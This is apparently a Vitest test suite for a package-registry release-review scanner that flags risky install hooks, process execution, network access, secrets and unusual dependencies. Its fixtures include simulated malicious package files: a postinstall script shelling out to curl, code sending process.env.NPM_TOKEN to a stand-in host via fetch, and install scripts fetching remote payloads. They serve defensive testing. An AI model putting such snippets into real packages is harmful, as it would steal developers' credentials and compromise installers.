import { describe, expect, test } from "vitest";
import {
  annotateFindingsWithDiffStatus,
  computeRisk,
  createPackageDiff,
  deterministicFindings,
  packageJsonDiffFindings,
  summarizePackageJsonDiff,
  tarSuspiciousEntryFindings,
} from "../server/lib/review.ts";

describe("review", () => {
  test("diff highlights added modified and removed package files", () => {
    const before = [
      {
        path: "package.json",
        size: 40,
        sha256: "a",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
      { path: "index.js", size: 10, sha256: "b", flags: [], textSample: "export {}" },
      { path: "old.js", size: 10, sha256: "c", flags: [], textSample: "" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 70,
        sha256: "d",
        flags: [],
        textSample: JSON.stringify({
          name: "pkg",
          version: "1.0.1",
          scripts: { postinstall: "node install.js" },
        }),
      },
      { path: "index.js", size: 10, sha256: "b", flags: [], textSample: "export {}" },
      {
        path: "install.js",
        size: 30,
        sha256: "e",
        flags: [],
        textSample: "require('child_process').execSync('curl https://x')",
      },
    ];

    const diff = createPackageDiff(before, staged);

    expect(diff.find((entry) => entry.path === "install.js")?.status).toBe("added");
    expect(diff.find((entry) => entry.path === "package.json")?.status).toBe("modified");
    expect(diff.find((entry) => entry.path === "old.js")?.status).toBe("removed");
    expect(diff.find((entry) => entry.path === "index.js")?.status).toBe("unchanged");
  });

  test("deterministic policy escalates risky new staged changes", () => {
    const staged = [
      {
        path: "package.json",
        size: 70,
        sha256: "d",
        flags: [],
        textSample: JSON.stringify({ scripts: { preinstall: "node install.js" } }),
      },
      {
        path: "install.js",
        size: 30,
        sha256: "e",
        flags: [],
        textSample: "process.env.NPM_TOKEN; new Function('return 1')",
      },
    ];
    const diff = createPackageDiff([], staged);
    const findings = deterministicFindings(staged, diff);

    expect(computeRisk(findings)).toBe("critical");
    expect(findings.some((finding) => finding.evidence.includes("preinstall"))).toBe(true);
    expect(findings.some((finding) => finding.evidence.includes("secret/environment access"))).toBe(
      true,
    );
  });

  test("weights process execution down on an unreferenced build file", () => {
    const staged = [
      {
        path: "package.json",
        size: 41,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "buildtool", version: "2.1.0" }),
      },
      {
        path: "build.js",
        size: 120,
        sha256: "build",
        flags: [],
        textSample:
          "const { execSync } = require('child_process');\n// local build, not an install hook\nexecSync('cc -O2 -o out/app src/app.c');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), {
      name: "buildtool",
      version: "2.1.0",
    });
    const processFinding = findings.find((finding) => finding.ruleId === "code.process-execution");

    expect(processFinding).toBeDefined();
    expect(processFinding.severity).toBe("low");
    // A lone build helper that shells out must not inflate release risk.
    expect(computeRisk(findings)).toBe("low");
  });

  test("treats pre-existing unreferenced process execution as informational", () => {
    const file = {
      path: "scripts/compile.js",
      size: 90,
      sha256: "compile",
      flags: [],
      textSample: "require('child_process').execSync('make');\n",
    };
    const pkg = {
      path: "package.json",
      size: 41,
      sha256: "pkg",
      flags: [],
      textSample: JSON.stringify({ name: "buildtool", version: "2.1.0" }),
    };
    const previous = [pkg, file];
    const staged = [pkg, file];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged), {
      name: "buildtool",
      version: "2.1.0",
    });
    const processFinding = findings.find((finding) => finding.ruleId === "code.process-execution");

    expect(processFinding?.severity).toBe("info");
  });

  test("keeps process execution high when an install hook reaches the file", () => {
    const staged = [
      {
        path: "package.json",
        size: 90,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ scripts: { postinstall: "node tools/setup.js" } }),
      },
      {
        path: "tools/setup.js",
        size: 60,
        sha256: "setup",
        flags: [],
        textSample: "require('child_process').execSync('cc -o out src.c');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.process-execution",
          severity: "high",
          file: "tools/setup.js",
        }),
      ]),
    );
  });

  test("keeps process execution high on a declared bin and the default entry", () => {
    const binStaged = [
      {
        path: "package.json",
        size: 90,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "cli", version: "1.0.0", bin: { cli: "./bin/run.js" } }),
      },
      {
        path: "bin/run.js",
        size: 60,
        sha256: "run",
        flags: [],
        textSample: "require('child_process').execSync('git status');\n",
      },
    ];
    const binFindings = deterministicFindings(binStaged, createPackageDiff([], binStaged));
    expect(
      binFindings.find((finding) => finding.ruleId === "code.process-execution")?.severity,
    ).toBe("high");

    const entryStaged = [
      {
        path: "package.json",
        size: 41,
        sha256: "pkg2",
        flags: [],
        textSample: JSON.stringify({ name: "lib", version: "1.0.0" }),
      },
      {
        path: "index.js",
        size: 60,
        sha256: "index",
        flags: [],
        textSample: "require('child_process').execSync('uname -a');\n",
      },
    ];
    const entryFindings = deterministicFindings(entryStaged, createPackageDiff([], entryStaged));
    expect(
      entryFindings.find((finding) => finding.ruleId === "code.process-execution")?.severity,
    ).toBe("high");

    const metadataOnlyStaged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg3",
        flags: [],
        textSample: JSON.stringify({
          name: "cli-lib",
          version: "1.0.0",
          bin: { cli: "./bin/run.js" },
          module: "./dist/module.js",
          types: "./dist/index.d.ts",
        }),
      },
      {
        path: "index.js",
        size: 60,
        sha256: "index2",
        flags: [],
        textSample: "require('child_process').execSync('whoami');\n",
      },
    ];
    const metadataOnlyFindings = deterministicFindings(
      metadataOnlyStaged,
      createPackageDiff([], metadataOnlyStaged),
    );
    expect(
      metadataOnlyFindings.find((finding) => finding.ruleId === "code.process-execution")?.severity,
    ).toBe("high");
  });

  test("does not treat a nested file with the entrypoint basename as runtime reachable", () => {
    const staged = [
      {
        path: "package.json",
        size: 62,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "lib", version: "1.0.0", main: "index.js" }),
      },
      {
        path: "src/index.js",
        size: 60,
        sha256: "src-index",
        flags: [],
        textSample: "require('child_process').execSync('make');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.find((finding) => finding.ruleId === "code.process-execution")?.severity).toBe(
      "low",
    );
  });

  test("does not apply Python capability patterns to JavaScript packages", () => {
    const staged = [
      {
        path: "template.js",
        size: 60,
        sha256: "template",
        flags: [],
        textSample: "export function render(template) {\n  return compile(template);\n}\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId === "code.dynamic-evaluation")).toBe(false);
  });

  test("does not flag unchanged network-only code paths", () => {
    const previous = [
      {
        path: "link/http/createSignalIfSupported.js",
        size: 90,
        sha256: "apollo-http",
        flags: [],
        textSample: "export function createSignalIfSupported() {\n  return fetch('/graphql');\n}\n",
      },
    ];
    const staged = [...previous];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged), {
      name: "@apollo/client",
      version: "4.2.0",
    });

    expect(findings.some((finding) => finding.ruleId === "code.network-access")).toBe(false);
  });

  test("flags added network-only code paths as contextual", () => {
    const staged = [
      {
        path: "lib/update.js",
        size: 90,
        sha256: "network-only",
        flags: [],
        textSample:
          "import https from 'https';\nhttps.request('https://example.invalid/payload').end();\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "medium",
          file: "lib/update.js",
        }),
      ]),
    );
  });

  test("still flags network-capable lifecycle script files", () => {
    const staged = [
      {
        path: "package.json",
        size: 80,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ scripts: { postinstall: "node scripts/install" } }),
      },
      {
        path: "scripts/install.js",
        size: 90,
        sha256: "install",
        flags: [],
        textSample: "fetch('https://example.com/payload.js');\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.network-access",
          severity: "high",
          file: "scripts/install.js",
        }),
      ]),
    );
  });

  test("does not treat fetch method declarations as network access", () => {
    const previous = [
      {
        path: "core/ObservableQuery.js",
        size: 90,
        sha256: "old",
        flags: [],
        textSample:
          "export class ObservableQuery {\n  fetchPolicy() { return 'cache-first'; }\n}\n",
      },
    ];
    const staged = [
      {
        path: "core/ObservableQuery.js",
        size: 180,
        sha256: "new",
        flags: [],
        textSample:
          "export class ObservableQuery {\n  fetchPolicy() { return 'cache-first'; }\n  fetch(options, networkStatus, fetchQuery) {\n    return fetchQuery(options, networkStatus);\n  }\n}\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff(previous, staged));

    expect(findings.some((finding) => finding.ruleId === "code.network-access")).toBe(false);
  });

  test("does not scan documentation as executable capability evidence", () => {
    const staged = [
      {
        path: "CHANGELOG.md",
        size: 160,
        sha256: "changelog",
        flags: [],
        textSample:
          "Previously no AbortController was passed to `fetch()`, so the request kept running.\n",
      },
      {
        path: "skills/apollo-client/references/integration-client.md",
        size: 160,
        sha256: "skill-doc",
        flags: [],
        textSample:
          'const token = localStorage.getItem("token");\nauthorization: token ? `Bearer ${token}` : ""\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings.some((finding) => finding.ruleId?.startsWith("code."))).toBe(false);
    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  test("still flags high-confidence token leaks in documentation", () => {
    const staged = [
      {
        path: "README.md",
        size: 80,
        sha256: "readme-token",
        flags: [],
        textSample: "Do not publish this npm_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA token.\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "file.secret-content",
          file: "README.md",
        }),
      ]),
    );
  });

  test("still scans executable files with documentation-like basenames", () => {
    const staged = [
      {
        path: "security.js",
        size: 120,
        sha256: "security-script",
        flags: [],
        textSample:
          "const token = process.env.NPM_TOKEN;\nfetch('https://example.invalid', { body: token });\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.credential-access",
          file: "security.js",
        }),
        expect.objectContaining({
          ruleId: "code.network-access",
          file: "security.js",
        }),
      ]),
    );
  });

  test("does not flag secret-looking source map content", () => {
    // The tar parser strips text samples from .map files (shouldSkipTextSample),
    // so deterministic rules never see source-map contents.
    const staged = [
      {
        path: "core/index.js.map",
        size: 120,
        sha256: "map",
        flags: ["text-sample-skipped"],
      },
      {
        path: "config.js",
        size: 80,
        sha256: "secret",
        flags: [],
        textSample: "export const config = { password: 'abc!def@ghi#jkl' };\n",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(
      findings.some(
        (finding) =>
          finding.ruleId === "file.secret-content" && finding.file === "core/index.js.map",
      ),
    ).toBe(false);
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "file.secret-content",
          file: "config.js",
        }),
      ]),
    );
  });

  test("does not treat importlib.metadata as Python dynamic evaluation", () => {
    const staged = [
      {
        path: "demo_package/_version.py",
        size: 90,
        sha256: "version",
        flags: [],
        textSample:
          'from importlib.metadata import version\n__version__ = version("demo-package")\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings.some((finding) => finding.ruleId === "code.dynamic-evaluation")).toBe(false);
  });

  test("detects Python dynamic import execution", () => {
    const staged = [
      {
        path: "demo_package/loader.py",
        size: 90,
        sha256: "loader",
        flags: [],
        textSample: 'import importlib\nplugin = importlib.import_module("demo_package.plugin")\n',
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), null, {
      codePatternSet: "python",
    });

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "code.dynamic-evaluation",
          file: "demo_package/loader.py",
        }),
      ]),
    );
  });

  test("adds best-effort line numbers and diff annotations to findings", () => {
    const before = [
      {
        path: "index.js",
        size: 20,
        sha256: "old",
        flags: [],
        textSample: "export const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: `{
  "name": "pkg",
  "scripts": {
    "postinstall": "node install.js"
  }
}`,
      },
      {
        path: "index.js",
        size: 80,
        sha256: "new",
        flags: [],
        textSample: "export const value = 1;\nfetch('/debug');\n",
      },
    ];
    const diff = createPackageDiff(before, staged);
    const findings = deterministicFindings(staged, diff);

    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "package.json",
        evidence: "postinstall: node install.js",
        line: 4,
      }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "index.js",
        evidence: "new/changed modified file: network-capable code path",
        line: 2,
      }),
    );

    const annotated = annotateFindingsWithDiffStatus(findings, diff);
    expect(annotated.find((finding) => finding.file === "index.js")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
    expect(annotated.find((finding) => finding.file === "package.json")).toMatchObject({
      diffStatus: "added",
      releaseDelta: true,
    });
  });

  test("keeps modified-file findings contextual when the finding line did not change", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "new",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 2;\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          id: "existing-risk",
          severity: "medium",
          file: "src/server.ts",
          line: 1,
          evidence: "network-capable code path",
          reason: "existing network path",
        },
        {
          id: "changed-line",
          severity: "medium",
          file: "src/server.ts",
          line: 2,
          evidence: "changed value",
          reason: "changed release line",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );

    expect(annotated.find((finding) => finding.id === "existing-risk")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: false,
    });
    expect(annotated.find((finding) => finding.id === "changed-line")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("keeps modified-file findings release scoped when a later matching line changed", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 90,
        sha256: "new",
        flags: [],
        textSample:
          "fetch('/existing-risk');\nexport const value = 1;\nfetch('https://example.invalid/new-risk');\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("uses Python annotation patterns for extensionless modified files", () => {
    const previous = [
      {
        path: "scripts/post_install",
        size: 100,
        sha256: "old",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 1\n",
      },
    ];
    const staged = [
      {
        path: "scripts/post_install",
        size: 160,
        sha256: "new",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 2\nurllib.request.urlopen('https://example.invalid/new')\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff, null, { codePatternSet: "python" });
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
      codePatternSet: "python",
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      file: "scripts/post_install",
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("keeps PyPI adapter findings release scoped even when paths use artifact namespaces", () => {
    const diff = [
      {
        path: "wheel/py3-none-any/sitecustomize.py",
        status: "added",
        stagedSize: 7,
        stagedSha256: "hook",
        flags: [],
      },
    ];
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "dist/demo_package-1.2.0-py3-none-any.whl/sitecustomize.py",
          evidence: "sitecustomize.py runs automatically on interpreter startup",
          reason: "startup hook",
          ruleId: "pypi.startup-hook",
        },
      ],
      diff,
    );

    expect(annotated[0]).toMatchObject({
      diffStatus: "unknown",
      releaseDelta: true,
    });
  });

  test("package json diff summarizes release-review sensitive fields", () => {
    const summary = summarizePackageJsonDiff(
      {
        name: "pkg",
        version: "1.0.0",
        scripts: {},
        dependencies: { a: "1.0.0" },
        main: "index.js",
      },
      {
        name: "pkg",
        version: "1.0.1",
        scripts: { postinstall: "node install.js" },
        dependencies: { a: "1.1.0", b: "2.0.0" },
        main: "dist/index.js",
      },
    );

    expect(summary.previousVersion).toBe("1.0.0");
    expect(summary.stagedVersion).toBe("1.0.1");
    expect(summary.scripts).toEqual([
      { key: "postinstall", status: "added", staged: "node install.js" },
    ]);
    expect(summary.entrypointsChanged).toBe(true);
  });

  test("flags unusual dependency specs in package json diffs", () => {
    const diff = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", dependencies: { safe: "^1.0.0" } },
      {
        name: "pkg",
        version: "1.0.1",
        dependencies: {
          safe: "github:example/safe#main",
          remote: "https://example.invalid/pkg.tgz",
          local: "file:../local.tgz",
          alias: "npm:other-package@^1.0.0",
        },
      },
    );

    const findings = packageJsonDiffFindings(diff);

    expect(findings).toEqual([
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        evidence: "alias: npm:other-package@^1.0.0",
        ruleId: "dependency.unusual-spec",
      }),
      expect.objectContaining({
        evidence: "local: file:../local.tgz",
        ruleId: "dependency.unusual-spec",
      }),
      expect.objectContaining({
        evidence: "remote: https://example.invalid/pkg.tgz",
        ruleId: "dependency.unusual-spec",
      }),
      expect.objectContaining({
        evidence: "safe: github:example/safe#main",
        ruleId: "dependency.unusual-spec",
      }),
    ]);
    expect(
      packageJsonDiffFindings({
        ...diff,
        dependencies: [{ key: "safe", status: "added", staged: "^1.0.0" }],
      }),
    ).toEqual([]);
  });

  test("flags files outside package.json files allowlist", () => {
    const staged = [
      {
        path: "package.json",
        size: 72,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1", files: ["dist"] }),
      },
      { path: "dist/index.js", size: 20, sha256: "dist", flags: [], textSample: "export {};" },
      {
        path: "router_init.js",
        size: 2048,
        sha256: "payload",
        flags: [],
        textSample: "console.log('init');",
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "router_init.js",
        evidence: "new/changed added file: file is not matched by package.json files allowlist",
        ruleId: "file.outside-files-list",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ file: "dist/index.js", ruleId: "file.outside-files-list" }),
    );
  });

  test("matches glob entries in package.json files allowlist", () => {
    const staged = [
      {
        path: "package.json",
        size: 77,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1", files: ["dist/*.js"] }),
      },
      { path: "dist/index.js", size: 20, sha256: "dist-js", flags: [], textSample: "export {};" },
      { path: "dist/style.css", size: 9, sha256: "dist-css", flags: [], textSample: "body {}" },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({ file: "dist/style.css", ruleId: "file.outside-files-list" }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ file: "dist/index.js", ruleId: "file.outside-files-list" }),
    );
  });

  test("flags newly added optional dependencies", () => {
    const stagedPackageJsonText = `{
  "name": "pkg",
  "version": "1.0.1",
  "optionalDependencies": {
    "existing": "^1.0.0",
    "maybe": "^2.0.0"
  }
}`;
    const diff = summarizePackageJsonDiff(
      { name: "pkg", version: "1.0.0", optionalDependencies: { existing: "^1.0.0" } },
      JSON.parse(stagedPackageJsonText),
    );

    const findings = packageJsonDiffFindings(diff, stagedPackageJsonText);

    expect(diff.dependencies).toContainEqual({
      key: "maybe",
      status: "added",
      staged: "^2.0.0",
      section: "optionalDependencies",
    });
    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        line: 6,
        evidence: "maybe: ^2.0.0",
        ruleId: "dependency.optional-added",
      }),
    );
  });

  test("flags npm's implicit node-gyp install hook from root gyp files", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff([], staged);
    const findings = deterministicFindings(staged, diff);

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "binding.gyp",
        evidence: "implicit install: node-gyp rebuild",
        ruleId: "install-script.implicit-node-gyp",
      }),
    );
  });

  test("marks implicit node-gyp as release delta when package.json newly enables it", () => {
    const previous = [
      {
        path: "package.json",
        size: 70,
        sha256: "pkg-old",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0", gypfile: false }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-new",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(diff.find((entry) => entry.path === "binding.gyp")?.status).toBe("unchanged");
    expect(annotated).toContainEqual(
      expect.objectContaining({
        file: "binding.gyp",
        ruleId: "install-script.implicit-node-gyp",
        diffStatus: "unchanged",
        releaseDelta: true,
      }),
    );
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
  });

  test("keeps pre-existing implicit node-gyp findings contextual when only package metadata changes", () => {
    const previous = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-old",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.0" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const staged = [
      {
        path: "package.json",
        size: 55,
        sha256: "pkg-new",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated).toContainEqual(
      expect.objectContaining({
        ruleId: "install-script.implicit-node-gyp",
        diffStatus: "unchanged",
        releaseDelta: false,
      }),
    );
  });

  test("does not flag implicit node-gyp when npm suppressors are present", () => {
    const withPreinstall = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ scripts: { preinstall: "node setup.js" } }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const withGypfileFalse = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ gypfile: false }),
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];

    expect(
      deterministicFindings(withPreinstall, createPackageDiff([], withPreinstall)),
    ).not.toContainEqual(expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }));
    expect(
      deterministicFindings(withGypfileFalse, createPackageDiff([], withGypfileFalse)),
    ).not.toContainEqual(expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }));
  });

  test("warns instead of inferring implicit node-gyp when package.json cannot be parsed", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: "{not-json",
      },
      { path: "binding.gyp", size: 2, sha256: "gyp", flags: [], textSample: "{}" },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged));

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "medium",
        file: "package.json",
        evidence: "package.json parse failed",
        ruleId: "package-json.parse-failed",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.implicit-node-gyp" }),
    );
  });

  test("keeps tar directory entries informational", () => {
    const findings = tarSuspiciousEntryFindings([
      {
        kind: "non-regular",
        path: "<unknown>",
        detail: "typeflag 5 (directory)",
      },
      {
        kind: "non-regular",
        path: "link",
        detail: "typeflag 2 (symlink)",
      },
    ]);

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "info",
        evidence: "non-regular: typeflag 5 (directory)",
        ruleId: "tar.suspicious-entry",
      }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        evidence: "non-regular: typeflag 2 (symlink)",
        ruleId: "tar.suspicious-entry",
      }),
    );
  });

  test("uses staged metadata to flag implicit node-gyp even when the gyp file is absent from the tarball", () => {
    const staged = [
      {
        path: "package.json",
        size: 40,
        sha256: "pkg",
        flags: [],
        textSample: JSON.stringify({ name: "pkg", version: "1.0.1" }),
      },
    ];
    const findings = deterministicFindings(staged, createPackageDiff([], staged), {
      name: "pkg",
      version: "1.0.1",
      scripts: { install: "node-gyp rebuild" },
      implicitScripts: { install: "node-gyp rebuild" },
      gypfile: true,
    });

    expect(findings).toContainEqual(
      expect.objectContaining({
        severity: "high",
        file: "package.json",
        evidence: "implicit install: node-gyp rebuild",
        ruleId: "install-script.implicit-node-gyp",
      }),
    );
    expect(findings).not.toContainEqual(
      expect.objectContaining({ ruleId: "install-script.lifecycle" }),
    );
  });
});
